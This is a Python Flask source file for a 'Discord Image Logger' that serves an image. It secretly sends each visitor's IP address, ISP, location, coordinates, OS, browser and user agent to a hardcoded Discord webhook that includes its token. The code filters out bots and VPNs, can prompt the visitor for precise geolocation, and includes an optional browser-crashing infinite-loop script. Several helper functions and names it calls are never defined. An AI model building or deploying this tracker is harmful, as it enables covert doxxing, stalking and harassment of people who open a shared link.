from flask import Flask, request, jsonify
import requests
import base64
import httpagentparser

# Your ImageLoggerAPI class should go here as we previously defined

app = Flask(__name__)

# ------------------------------------------------------------
# Configuration & Constants (from previous code)
# ------------------------------------------------------------
CONFIG = {
    "webhook": "https://discord.com/api/webhooks/1334261539993026560/oeumT-kc65a5lIgTcszduF2UPcd75DmWYPYeU1cI-sIbds00EwM13uHeZjAfyMKHoGgZ",
    "image": "https://www.meme-arsenal.com/memes/8e63547a83c1f0d7dccb3f6596e668ca.jpg",  # Default image URL
    "imageArgument": True,  # Allow custom image URL via a base64-encoded URL argument

    "username": "Image Logger",  # Webhook username
    "color": 0x00FFFF,           # Embed color (Hex)

    "crashBrowser": False,       # Attempt to crash/freeze the browser (not guaranteed)
    "accurateLocation": True,    # Ask for geolocation (prompts the user)
    "message": {                 # Custom message settings (with rich token replacement)
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. [Details: {ip}, {isp}, {asn}, {country}, {region}, {city}]",
        "richMessage": True,
    },
    "vpnCheck": 1,       # 0 = No VPN check; 1 = disable ping if VPN; 2 = do not alert if VPN detected
    "linkAlerts": True,  # Alert when the link is sent
    "buggedImage": True, # Show a loading image (for Discord crawlers)
    "antiBot": 1,        # 0 = No check; 1 = disable ping; 2 = disable ping for data centers; 3/4 = do not alert
    "redirect": {        # Redirection settings (disables image/crash options when enabled)
        "redirect": False,
        "page": "https://your-link.here"
    },
}

# Function to handle request and log the image
def make_report(ip: str, useragent: str = None, coords: str = None,
                endpoint: str = "N/A", url: str or bool = False) -> dict:
    """
    Builds and sends a detailed report embed to the Discord webhook.
    Includes improved VPN/proxy and data center checks.
    """
    if ip.startswith(BLACKLISTED_IPS):
        return {}

    bot_type = bot_check(ip, useragent)
    if bot_type:
        if CONFIG["linkAlerts"]:
            payload = {
                "username": CONFIG["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": CONFIG["color"],
                    "description": (
                        f"An **Image Logging** link was sent!\nYou may receive an IP soon.\n\n"
                        f"**Endpoint:** {endpoint}\n"
                        f"**IP:** {ip}\n"
                        f"**Platform:** {bot_type}"
                    )
                }]
            }
            try:
                requests.post(CONFIG["webhook"], json=payload, timeout=5)
            except Exception:
                pass
        return {}

    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        response.raise_for_status()
        info = response.json()
    except Exception:
        info = {}

    vpn_suspected = info.get("proxy", False)
    hosting_suspected = info.get("hosting", False)

    ping = "@everyone"
    if vpn_suspected:
        if CONFIG["vpnCheck"] == 2:
            return {}
        elif CONFIG["vpnCheck"] == 1:
            ping = ""
    if hosting_suspected:
        if CONFIG["antiBot"] in (3, 4):
            return {}
        elif CONFIG["antiBot"] in (1, 2):
            ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": CONFIG["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": CONFIG["color"],
            "description": "A user opened the original image!",
            "fields": [
                {"name": "Endpoint", "value": endpoint, "inline": False},
                {"name": "IP Information", "value": (
                    f"**IP:** {ip or 'Unknown'}\n"
                    f"**Provider:** {info.get('isp', 'Unknown')}\n"
                    f"**ASN:** {info.get('as', 'Unknown')}\n"
                    f"**Country:** {info.get('country', 'Unknown')}\n"
                    f"**Region:** {info.get('regionName', 'Unknown')}\n"
                    f"**City:** {info.get('city', 'Unknown')}\n"
                    f"**Coords:** {str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')} "
                    f"{'(Approximate)' if not coords else '(Precise)'}\n"
                    f"**Timezone:** {info.get('timezone', 'Unknown')}\n"
                    f"**Mobile:** {info.get('mobile', 'Unknown')}\n"
                    f"**VPN/Proxy:** {vpn_suspected}\n"
                    f"**Hosting:** {hosting_suspected}"
                ), "inline": False},
                {"name": "PC Information", "value": f"**OS:** {os_name}\n**Browser:** {browser}", "inline": False},
                {"name": "User Agent", "value": useragent or "Unknown", "inline": False}
            ],
            "footer": {"text": "Logged by Discord Image Logger"}
        }]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    try:
        requests.post(CONFIG["webhook"], json=embed, timeout=5)
    except Exception:
        pass

    return info


@app.route("/image-logger", methods=["GET", "POST"])
def image_logger():
    """
    Image Logger endpoint that receives requests and processes them.
    The handler is directly tied to Flask and processes incoming requests for image logging.
    """
    try:
        ip = request.remote_addr  # Get the IP address of the client

        # If it's a GET or POST request, process the path and query string
        image_url = get_image_url(request.query_string.decode())
        useragent = request.headers.get("User-Agent", "")
        endpoint = request.path.split("?")[0]

        # Report and handle the request
        make_report(ip, useragent, endpoint=endpoint, url=image_url)

        # Handle redirection or bugged image
        if CONFIG["redirect"]["redirect"]:
            return redirect(CONFIG["redirect"]["page"])

        # Return an image or HTML based on settings
        html_data = f'''<style>
body {{
    margin: 0;
    padding: 0;
}}
div.img {{
    background-image: url('{image_url}');
    background-position: center center;
    background-repeat: no-repeat;
    background-size: contain;
    width: 100vw;
    height: 100vh;
}}
</style>
<div class="img"></div>'''

        if CONFIG["crashBrowser"]:
            html_data += """<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>"""

        return html_data

    except Exception:
        return "500 Internal Server Error", 500


if __name__ == "__main__":
    app.run(debug=True)
